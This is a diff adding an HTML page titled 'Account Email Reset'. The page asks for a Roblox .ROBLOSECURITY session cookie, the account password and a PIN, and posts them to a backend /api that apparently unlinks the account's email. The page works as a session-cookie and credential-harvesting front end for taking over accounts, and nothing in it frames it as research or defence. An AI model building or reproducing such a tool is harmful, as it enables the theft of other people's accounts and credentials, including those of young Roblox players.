@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Account Email Reset</title>
+<style>
+  :root { color-scheme: dark; }
+  body { margin:0; font:14px/1.5 system-ui,sans-serif;
+         background:#0b0d10; color:#e6e8eb;
+         display:flex; min-height:100vh; align-items:center;
+         justify-content:center; padding:24px; }
+  .card { width:100%; max-width:520px; background:#14171c;
+          border:1px solid #23272e; border-radius:12px;
+          padding:24px; }
+  h1 { font-size:16px; margin:0 0 16px; letter-spacing:.2px; }
+  label { display:block; font-size:12px; color:#8b919a;
+          margin:12px 0 4px; }
+  input, textarea { width:100%; box-sizing:border-box;
+          background:#0b0d10; color:#e6e8eb;
+          border:1px solid #2a2f37; border-radius:8px;
+          padding:10px; font:inherit; }
+  textarea { min-height:80px; resize:vertical;
+             font-family:ui-monospace,monospace; font-size:12px; }
+  button { margin-top:16px; width:100%; padding:11px;
+           background:#e6e8eb; color:#0b0d10; border:0;
+           border-radius:8px; font-weight:600; cursor:pointer; }
+  button:disabled { opacity:.5; cursor:default; }
+  pre { margin-top:16px; background:#0b0d10; border:1px solid #23272e;
+        border-radius:8px; padding:12px; font-size:12px;
+        white-space:pre-wrap; word-break:break-word;
+        max-height:260px; overflow:auto; }
+  .ok  { color:#4ade80; } .bad { color:#f87171; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Account Email Reset</h1>
+
+  <label>ROBLOSECURITY cookie</label>
+  <textarea id="cookie" placeholder="paste .ROBLOSECURITY value"></textarea>
+
+  <label>Account password</label>
+  <input id="password" type="password" autocomplete="off">
+
+  <label>Account PIN (optional)</label>
+  <input id="pin" type="password" autocomplete="off">
+
+  <button id="go">Unlink Email</button>
+  <pre id="out">idle</pre>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const out = $("out");
+
+$("go").addEventListener("click", async () => {
+  const cookie   = $("cookie").value.trim();
+  const password = $("password").value;
+  const pin      = $("pin").value.trim();
+
+  if (!cookie || !password) {
+    out.className = "bad";
+    out.textContent = "cookie and password required";
+    return;
+  }
+
+  $("go").disabled = true;
+  out.className = "";
+  out.textContent = "running...";
+
+  try {
+    const res = await fetch("/api", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cookie, password, pin })
+    });
+    const data = await res.json();
+
+    out.className = data.ok ? "ok" : "bad";
+    out.textContent = [
+      `ok:       ${data.ok}`,
+      `user:     ${data.user ?? "-"} (${data.uid ?? "-"})`,
+      `before:   ${data.before ?? "-"}`,
+      `after:    ${data.after ?? "-"}`,
+      `message:  ${data.msg}`
+    ].join("\n");
+  } catch (e) {
+    out.className = "bad";
+    out.textContent = "request failed: " + e.message;
+  } finally {
+    $("go").disabled = false;
+  }
+});
+</script>
+</body>
+</html>
